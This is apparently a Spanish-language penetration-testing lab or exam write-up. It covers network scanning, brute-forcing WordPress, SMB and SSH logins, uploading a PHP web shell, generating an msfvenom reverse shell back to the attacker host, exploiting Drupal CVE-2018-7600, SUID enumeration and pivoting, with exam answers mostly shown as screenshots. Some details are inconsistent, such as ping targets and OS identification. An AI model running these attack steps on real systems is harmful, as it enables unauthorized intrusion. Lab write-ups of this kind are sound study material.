tags:
____
### MAPA DE RED
____
![Pasted image 20251023085513.png](Pasted%20image%2020251023085513.png)
### RECONOCIMIENTO
____
Primero vamos a realizar un barrido de la red para ver qué hosts tenemos al alcance. Para ello, vamos a buscar el nombre de nuestra interfaz de red con el comando **ip a** y el uso posterior del comando **arp-scan**:

```bash
ip a
```


![Pasted image 20251021062111](Hacking-repo-obs/Anexos/Pasted%20image%2020251021062111.png)

```bash
arp-scan -I eth0 --localnet 
```

![Pasted image 20251021064118](Hacking-repo-obs/Anexos/Pasted%20image%2020251021064118.png)

Ahora que tenemos la lista de ips, vamos a ejecutar un escaneo básico masivo de nmap para hacer un reconocimiento rápido y básico de puertos abiertos, usando el siguiente comando de nmap:

```bash
nmap -p- --open -n -Pn -vvv -sS -oN full_scan 192.168.100.1,50,51,52,55,63,67 --min-rate 5000
```

### 192.168.100.50 - WINSERVER-01
____

La primera ip que intentaré atacar es la **192.168.100.50**. Vamos  iniciar la fase de escaneo con nmap. Primero me creo una carpeta en el escritorio con el nombre de la ip.
Luego, para un escaneo completo, lanzo el siguiente comando de nmap:

```bash
nmap -sS -p- -n -Pn -vvv --open --min-rate 5000 -oN ports 192.168.100.50
```

![Pasted image 20251021065331](Hacking-repo-obs/Anexos/Pasted%20image%2020251021065331.png)

También hacemos un ping para ver ante que sistema estamos:

```bash
ping -c 1 192.168.100.50
```

![Pasted image 20251021065413](Hacking-repo-obs/Anexos/Pasted%20image%2020251021065413.png)

Estamos ante una máquina windows.

Vamos ahora a ejecutar un comando de nmap para hacer un reconocimiento de versiones y vulnerabilidades de los servicios que corren por los puertos abiertos:

```bash
nmap -sCV -n -Pn- -vvv -p80,135,139,445,3307,3389,5985,47001,49152,49153,49154,49155,49160,49174 --min-rate 5000 192.168.100.50 -oN versions
```

Por el ttl, es una máquina linux. Ahora vamos a lanzar otro comando de nmap para conocer la versión de los servicios que corren por los puertos que hemos descubierto y también unos scripts básicos de vulnerabilidades:

```bash
nmap -sCV -p22,3389,5910,45656 -n -Pn -oN versions 192.168.100.5
```


En el servicio http corre una página web, así que vamos a echarle un vistazo:

![Pasted image 20251021070326](Hacking-repo-obs/Anexos/Pasted%20image%2020251021070326.png)

Vemos muchas cosas de primeras, así que vamos primero a realizar fuzzing para encontrar directorios:

```bash
dirb http://192.168.100.50/
```

![Pasted image 20251021071356](Hacking-repo-obs/Anexos/Pasted%20image%2020251021071356.png)

Vemos que en el dominio nos está aplicando virtual hosting, por lo que vamos a añadir ese dominio a nuestro archivo local de hosts:

```bash
nano /etc/hosts
```

![Pasted image 20251021071746](Hacking-repo-obs/Anexos/Pasted%20image%2020251021071746.png)

![Pasted image 20251021071829](Hacking-repo-obs/Anexos/Pasted%20image%2020251021071829.png)

En este punto, vamos a utilizar el comando wpscan para analizar el sitio web en búsqueda de vulnerabilidades, plugins y usuarios:

```bash
wpscan --url http://192.168.100.50/wordpress/ --enumerate u,vp 
```

No nos muestra info ni de plugins ni de usuarios, así que vamos a intentar enumerar manualmente. Si ponemos un usuario inventado, nos da el siguiente error:

![Pasted image 20251021074257](Hacking-repo-obs/Anexos/Pasted%20image%2020251021074257.png)

Pero si ponemos admin y una contraseña incorrecta, vemos esto otro:

![Pasted image 20251021074333](Hacking-repo-obs/Anexos/Pasted%20image%2020251021074333.png)

Sabiendo esto, vamos a intentar hacer fuerza bruta con wpscan para sacar la contraseña:

```bash
wpscan --url http://192.168.100.50/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt
```

La tenemos, la contrasña es **estrella**

![Pasted image 20251021074619](Hacking-repo-obs/Anexos/Pasted%20image%2020251021074619.png)

Nos conectamos, y vemos un plugin de gestión de archivos, al que podemos acceder. Vamos a entrar en la carpeta de my-admin, y vamos a crear  un archivo php malicioso para lograr ejecución remota de comandos:

![Pasted image 20251021082955](Hacking-repo-obs/Anexos/Pasted%20image%2020251021082955.png)

Lo creamos con nano y lo llamamos, por ejemplo, ataque.php:

![Pasted image 20251021083344](Hacking-repo-obs/Anexos/Pasted%20image%2020251021083344.png)

![Pasted image 20251021083515](Hacking-repo-obs/Anexos/Pasted%20image%2020251021083515.png)

Ahora vamos a comprobar que existe la ruta: http://wordpress.local/wp-admin/ataque.php

![Pasted image 20251021083627](Hacking-repo-obs/Anexos/Pasted%20image%2020251021083627.png)

Existe y además hemos rooteado con éxito la primera máquina. Ahora, voy a enviarme una reverse shell a mi máquina atacante, para trabajar desde consola en local. Para ello, me pongo en escucha con netcat en mi máquina atacante por el puerto 443 con el siguiente comando:

```bash
nc -lnvp 443
```

![Pasted image 20251021084011](Hacking-repo-obs/Anexos/Pasted%20image%2020251021084011.png)

Y ahora ejecutamos el siguiente comando dentro de la URL:

```bash
msfvenom -p php/reverse_php LHOST=192.168.100.5 LPORT=443 -o shell.php
```

![Pasted image 20251021090604](Hacking-repo-obs/Anexos/Pasted%20image%2020251021090604.png)

Subimos el archivo al plugin y lo ejecutamos desde su ruta:

```bash
http://wordpress.local/wp-admin/shell.php
```

![Pasted image 20251021090728](Hacking-repo-obs/Anexos/Pasted%20image%2020251021090728.png)

Estamos en la máquina. Ahora hacemos un **ipconfig** para ver nuestra interfaz de red:

![900](Hacking-repo-obs/Anexos/Pasted%20image%2020251021091214.png)

No tenemos conexión con ninguna otra máquina, así que vamos a intentar responder todas las preguntas del examen relacionadas con esta máquina.:


![700](Hacking-repo-obs/Anexos/Pasted%20image%2020251021071114.png)

Para resolver esta pregunta, vamos a realizar un ataque de fuerza bruta con METASPLOIT:

Utilizando metasploit, con el payload **scanner/smb/smb_login** y seteando como PASS_FILE un archivo .txt con las cuatro opciones, nos arroja lo siguiente:

![Pasted image 20251021092144](Hacking-repo-obs/Anexos/Pasted%20image%2020251021092144.png)

### 192.168.100.51 - WINSERVER-02
____
La siguiente ip que intentaré atacar es la **192.168.100.51**. Vamos  iniciar la fase de escaneo con nmap. Primero me creo una carpeta en el escritorio con el nombre de la ip.
Luego, para un escaneo completo, lanzo el siguiente comando de nmap:

```bash
nmap -sS -p- -n -Pn -vvv --open --min-rate 5000 -oN ports 192.168.100.51
```

![Pasted image 20251021095035](Hacking-repo-obs/Anexos/Pasted%20image%2020251021095035.png)

```bash
ping -c 1 192.168.100.5
```

![Pasted image 20251021095110](Hacking-repo-obs/Anexos/Pasted%20image%2020251021095110.png)

Estamos ante otra máquina winows.
Ahora vamos a lanzar el segundo comando de nmap para escanear las versiones de los servicios que corren por esos puertos y vamos también a lanzar unos scripts básicos de reconocimiento de vulnerabilidades, con el siguiente comando:

```bash
nmap -sCV -n -Pn -vvv --min-rate 5000 -oN versions 192.168.100.51 -p21,80,135,139,445,3389,5985,47001,49152,49153,49154,49155,49156,49178
```

De primeras, vemos el nombre del host: **WINSERVER-02**

![Pasted image 20251021095800](Hacking-repo-obs/Anexos/Pasted%20image%2020251021095800.png)

Además de un sitio web, vemos también lo siguiente:

![Pasted image 20251021095850](Hacking-repo-obs/Anexos/Pasted%20image%2020251021095850.png)

El login anónimo de ftp está habilitado, así que vamos a acceder:

#### FTP ANONYMOYS LOG-IN

Entramos con el comando:

```bash
ftp 192.168.100.51
```

![Pasted image 20251021100010](Hacking-repo-obs/Anexos/Pasted%20image%2020251021100010.png)

Nos descargamos todos los archivos con el siguiente comando:

```bash
mget *
```

![Pasted image 20251021100244](Hacking-repo-obs/Anexos/Pasted%20image%2020251021100244.png)

Al ver el archivo cmdasp.aspx, voy a probar introducirlo en la ruta del navegador para ver de qué se trata:

```http
http://192.168.100.51/cmdasp.aspx
```

![Pasted image 20251021100646](Hacking-repo-obs/Anexos/Pasted%20image%2020251021100646.png)

Tenemos ejecución directa de comandos con el usuario **nt authority\system**

![Pasted image 20251021104857](Hacking-repo-obs/Anexos/Pasted%20image%2020251021104857.png)

Esta máquina tampoco tiene conectividad con ninguna, así que vamos a tratar de responder las preguntas asociadas a esta áquina.

### 192.168.100.52
____
La siguiente ip que intentaré atacar es la **192.168.100.51**. Vamos  iniciar la fase de escaneo con nmap. Primero me creo una carpeta en el escritorio con el nombre de la ip.
Luego, para un escaneo completo, lanzo el siguiente comando de nmap:

```bash
nmap -sS -p- -n -Pn -vvv --open --min-rate 5000 -oN ports 192.168.100.52
```

![Pasted image 20251021110127](Hacking-repo-obs/Anexos/Pasted%20image%2020251021110127.png)

```bash
ping -c 1 192.168.100.5
```

![Pasted image 20251021110231](Hacking-repo-obs/Anexos/Pasted%20image%2020251021110231.png)

Es un sistema linux. Ahora vamos a ejecutar otro comando de nmap para ver qué versiones y vulnerabilidades básicas encontramos:

```bash
nmap -sCV -n -Pn -vvv --min-rate 5000 -p21,22,80,139,445,3306,3389 --open -oN versions 192.168.100.52
```

Ya vemos aquí la primera vulnerabilidad:

![Pasted image 20251021110812](Hacking-repo-obs/Anexos/Pasted%20image%2020251021110812.png)

Vamos a traernos ese archivo a local:

![Pasted image 20251021114014.png](Pasted%20image%2020251021114014.png)

![Pasted image 20251021114054.png](Pasted%20image%2020251021114054.png)

Nos descubren al usuario **admin**. Vamos a ver el servicio web:

![Pasted image 20251021110955](Hacking-repo-obs/Anexos/Pasted%20image%2020251021110955.png)

Se trata de un drupal, y además es la sección más densa de la prueba.

Buscando info en internet, encuentro esta vulnerabilidad grave: **CVE-2018-7600** así que la buscamos en metasploit:

![Pasted image 20251021120449.png](Pasted%20image%2020251021120449.png)

Seteamos las opciones y lo ejecutmos:

![Pasted image 20251021122044](Hacking-repo-obs/Anexos/Pasted%20image%2020251021122044.png)

Ya estamos dentro de la máquina, ahora voy a enviarme una reverse shell a mi máquina atacante para tener una conexión más estable. Después de hacerlo y realizar el tratamiento de la tty, vamos a intentar entrar como el usuario admin por ssh a la máquina:

```bash
hydra -l dbadmin -P /usr/share/wordlists/rockyou.txt -I ssh://192.168.100.52
```

![Pasted image 20251021125941](Hacking-repo-obs/Anexos/Pasted%20image%2020251021125941.png)

Accedemos por SSH:

![Pasted image 20251021143610](Hacking-repo-obs/Anexos/Pasted%20image%2020251021143610.png)

Usando el siguiente comando busco binarios con SUID:

```bash
find / -perm -4000 2>/dev/null
```

![Pasted image 20251021143959](Hacking-repo-obs/Anexos/Pasted%20image%2020251021143959.png)

![Pasted image 20251021144019](Hacking-repo-obs/Anexos/Pasted%20image%2020251021144019.png)

![Pasted image 20251021144052.png](Pasted%20image%2020251021144052.png)

Máquina rooteada.

En el archivo settings.php encontramos las siguientes credenciales:

![Pasted image 20251021190050](Hacking-repo-obs/Anexos/Pasted%20image%2020251021190050.png)

Accedemos desde root de todas formas:

![Pasted image 20251022124106](Hacking-repo-obs/Anexos/Pasted%20image%2020251022124106.png)



### 192.168.100.55 - WINSERVER-03 - PIVOTING -> 192.168.0.50 - 192.168.0.51 - 192.168.0.57 
_____
La siguiente ip que intentaré atacar es la **192.168.100.55**. Vamos  iniciar la fase de escaneo con nmap. Primero me creo una carpeta en el escritorio con el nombre de la ip.
Luego, para un escaneo completo, lanzo el siguiente comando de nmap:

```bash
nmap -sS -p- -n -Pn -vvv --open --min-rate 5000 -oN ports 192.168.100.55 
```

![Pasted image 20251021160207](Hacking-repo-obs/Anexos/Pasted%20image%2020251021160207.png)

```bash
ping -c 1 192.168.100.5
```

![Pasted image 20251021160240](Hacking-repo-obs/Anexos/Pasted%20image%2020251021160240.png)

Es un sistema windows. Ahora vamos a ejecutar otro comando de nmap para ver qué versiones y vulnerabilidades básicas encontramos:

```bash
nmap -sCV -n -Pn -vvv --min-rate 5000 -p80,139,445,3389,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671,49692 --open -oN versions 192.168.100.55
```

![Pasted image 20251021160753](Hacking-repo-obs/Anexos/Pasted%20image%2020251021160753.png)

Tenemos el hostname.
Si haemos fuerza bruta con el usuario Administrator, la obtenemos:

```bash
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt -I smb://192.168.100.55
```

![Pasted image 20251021161344](Hacking-repo-obs/Anexos/Pasted%20image%2020251021161344.png)

Accedemos por rdp:



![900](Hacking-repo-obs/Anexos/Pasted%20image%2020251022072236.png)

![900](Hacking-repo-obs/Anexos/Pasted%20image%2020251022073006.png)



![900](Pasted%20image%2020251022072921.png)

Aquí vemos la red interna:

![Pasted image 20251022073132.png](Pasted%20image%2020251022073132.png)

![900](Pasted%20image%2020251022073826.png)

![Pasted image 20251022074607.png](Pasted%20image%2020251022074607.png)



![Pasted image 20251022094729.png](Pasted%20image%2020251022094729.png)

Ahora haago port forwarding a mi máquina para ver los servicios web, y nos encontramos con que tenemos un IIS y un Apache default. Vamos a haacer fuzzing a ambas:
#### PUERTOS ENCONTRADOS:

- **192.168.0.50**: 80:5000, 135:1135, 139:1139, 445:4445, 3389:3309, 5357, 5985, 8080:8081
- **192.168.0.51**: 22:2222, 80:5001, 3389, 10000
- **192.168.0.57**: 22:2223
- **192.168.0.61**:  Nada
- **192.168.0.255**:  Nada

![600](Hacking-repo-obs/Anexos/Pasted%20image%2020251022122149.png)

con smb login, localizo las credenciales:

![Pasted image 20251022115624.png](Pasted%20image%2020251022115624.png)

![Pasted image 20251022115642](Hacking-repo-obs/Anexos/Pasted%20image%2020251022115642.png)


![Pasted image 20251022121935.png](Pasted%20image%2020251022121935.png)

![Pasted image 20251022122233.png](Pasted%20image%2020251022122233.png)

![Pasted image 20251022130711.png](Pasted%20image%2020251022130711.png)




_____
## PREGUNTAS DEL EXAMEN
____
### PREGUNTA 1
______
![800](Pasted%20image%2020251021075619.png)

**EXPLICACIÓN**

En la ruta http://192.168.100.50/wordpress se encuentra instalado un wordpress, versión 5.9.3.

### PREGUNTA 2
____
![|800](Hacking-repo-obs/Anexos/Pasted%20image%2020251021181205.png)

**EXPLICACIÓN**

![500](Hacking-repo-obs/Anexos/Pasted%20image%2020251021181115.png)
### PREGUNTA 3
___
![800](Pasted%20image%2020251021080049.png)

**EXPLICACIÓN**

Si hacemos un escaneo masivo a todas las ips, pero solo por el puerto 80, vemos lo siguiente:

![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251021080746.png)

### PREGUNTA 4
____
![800](Pasted%20image%2020251021114454.png)

**EXPLICACIÓN**

![Pasted image 20251021114411](Hacking-repo-obs/Anexos/Pasted%20image%2020251021114411.png)

### PREGUNTA 5
___
![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251021123406.png)

**EXPLICACIÓN**

![Pasted image 20251021123339](Hacking-repo-obs/Anexos/Pasted%20image%2020251021123339.png)
### PREGUNTA 6
____
![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251021111808.png)

**EXPLICACIÓN**

![Pasted image 20251021111322](Hacking-repo-obs/Anexos/Pasted%20image%2020251021111322.png)

### PREGUNTA 7
___
![800](Pasted%20image%2020251022124409.png)

**EXPLICACIÓN**

![Pasted image 20251022124339](Hacking-repo-obs/Anexos/Pasted%20image%2020251022124339.png)
### PREGUNTA 8
___
![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251021124634.png)

**EXPLICACIÓN**

En el archivo changelog.txt se puede ver que esa es la última versión instalada:

![Pasted image 20251021124735.png](Pasted%20image%2020251021124735.png)

### PREGUNTA 9
____
![800](Pasted%20image%2020251021081353.png)

**EXPLICACIÓN**

De momento es creencia ya que puedo ver que solo las IPs **192.168.100.52** y **192.168.100.67** tienen el puerto 22 abierto, y al no darme la opción de la segunda, solo puede ser la **192.168.100.52**. Ninguna de las otras IPs tiene el puerto 22 abierto.

![Pasted image 20251021081922.png](Pasted%20image%2020251021081922.png)

Confirmado:

![Pasted image 20251021125941](Hacking-repo-obs/Anexos/Pasted%20image%2020251021125941.png)

### PREGUNTA 10 nada
____
![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251022132348.png)
### PREGUNTA 11
____
![800](Pasted%20image%2020251021150504.png)

**EXPLICACION**

En la configuración, habían unos archivos php ejecutables con permisos de escritura y lectura

### PREGUNTA 12
____
![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251021152421.png)

**EXPLICACIÓN**

```bash
find / -perm -4000 2>/dev/null
```

![Pasted image 20251021143959](Hacking-repo-obs/Anexos/Pasted%20image%2020251021143959.png)

![Pasted image 20251021144019](Hacking-repo-obs/Anexos/Pasted%20image%2020251021144019.png)

### PREGUNTA 13 nada
___
![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251022132753.png)

### PREGUNTA 14
____
![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251021081719.png)

**EXPLICACIÓN**

https://rapid7.github.io/metasploit-framework/docs/using-metasploit/intermediate/pivoting-in-metasploit.html

### PREGUNTA 15
___
![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251022100101.png)

**EXPLICACIÓN**

Estamos trabajando con las ips: 192.168.0.50 y 51, las cuales se ubican en la subnet indicada


### PREGUNTA 16
____
![800](Pasted%20image%2020251022095758.png)

**EXPLICACIÓN**

Pivoting realizado desde metasploit y desde la ip 192.168.100.55.
### PREGUNTA 17
____
![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251021161537.png)

**EXPLICACIÓN**

![Pasted image 20251021161344](Hacking-repo-obs/Anexos/Pasted%20image%2020251021161344.png)

### PREGUNTA 18
___
![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251022120000.png)

**EXPLICACIÓN**

![Pasted image 20251022115624.png](Pasted%20image%2020251022115624.png)

### PREGUNTA 19
_____
![700](Hacking-repo-obs/Anexos/Pasted%20image%2020251021071114.png)

**EXPLICACIÓN**

Utilizando metasploit, con el payload **scanner/smb/smb_login** y seteando como PASS_FILE un archivo .txt con las cuatro opciones, nos arroja lo siguiente:

![Pasted image 20251021092144](Hacking-repo-obs/Anexos/Pasted%20image%2020251021092144.png)

### PREGUNTA 20
____
![800](Pasted%20image%2020251022122315.png)

**EXPLICACIÓN**

Credenciales por defecto

### PREGUNTA 21
___
![800](Pasted%20image%2020251022121419.png)

**EXPLICACIÓN**

![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251022121511.png)

### PREGUNTA 22
___
![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251022132453.png)

**EXPLICACIÓN**

![Pasted image 20251022132553.png](Pasted%20image%2020251022132553.png)


### PREGUNTA 23
___
![800](Pasted%20image%2020251022125123.png)

**EXPLICACIÓN**

![Pasted image 20251022125056.png](Pasted%20image%2020251022125056.png)
### PREGUNTA 24
____
![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251021072433.png)

**EXPLICACIÓN**

Con el comando wp-scan, obtenemos la información de la versión:

![Pasted image 20251021072533](Hacking-repo-obs/Anexos/Pasted%20image%2020251021072533.png)


### PREGUNTA 25
___
![800](Pasted%20image%2020251021075809.png)

**EXPLICACIÓN**

En el escaneo inicial masivo, solo esta ip tiene el puerto 3307 abierto:

![Pasted image 20251021075300.png](Pasted%20image%2020251021075300.png)

### PREGUNTA 26
____
![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251021092348.png)

**EXPLICACIÓN**

Si leemos el archivo **wp-config** de la raíz del cms, vemos lo siguiente:

![550](Hacking-repo-obs/Anexos/Pasted%20image%2020251021092433.png)

### PREGUNTA 27
___
![800](Pasted%20image%2020251022123232.png)

**EXPLICACIÓN**

![Pasted image 20251022123307.png](Pasted%20image%2020251022123307.png)

### PREGUNTA 28 nada
____
![800](Pasted%20image%2020251022132711.png)

**EXPLICACIÓN**

![Pasted image 20251022124719.png](Pasted%20image%2020251022124719.png)
### PREGUNTA 29
___

![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251021101703.png)

**EXPLICACIÓN**

Si ejecutamos este comando de nmap, poniendo el parámetro -sT y --open, nos dirá cuántos puertos hay abiertos solamente por el protocolo tcp:

```bash
nmap -sT -p- 192.168.100.51 --open -vvv -n -Pn --min-rate 5000
```

![Pasted image 20251021101632](Hacking-repo-obs/Anexos/Pasted%20image%2020251021101632.png)

En total, **14**.

### PREGUNTA 30
___
![800](Pasted%20image%2020251022115807.png)

**EXPLICACIÓN**

![Pasted image 20251022115624.png](Pasted%20image%2020251022115624.png)

### PREGUNTA 31
____
![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251021104432.png)

**EXPLICACIÓN**

![Pasted image 20251021104413](Hacking-repo-obs/Anexos/Pasted%20image%2020251021104413.png)

### PREGUNTA 32
____
![Pasted image 20251021113555](Hacking-repo-obs/Anexos/Pasted%20image%2020251021113555.png)

**EXPLICACIÓN**

![Pasted image 20251021113613](Hacking-repo-obs/Anexos/Pasted%20image%2020251021113613.png)


### PREGUNTA 33 nada
___
![800](Pasted%20image%2020251022133319.png)
### PREGUNTA 34
___
![800](Pasted%20image%2020251021144352.png)

**EXPLICACIÓN**

![Pasted image 20251021144440](Hacking-repo-obs/Anexos/Pasted%20image%2020251021144440.png)

### PREGUNTA 35
___
![800](Pasted%20image%2020251022063604.png)

**EXPLICACIÓN**

![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251022063652.png)
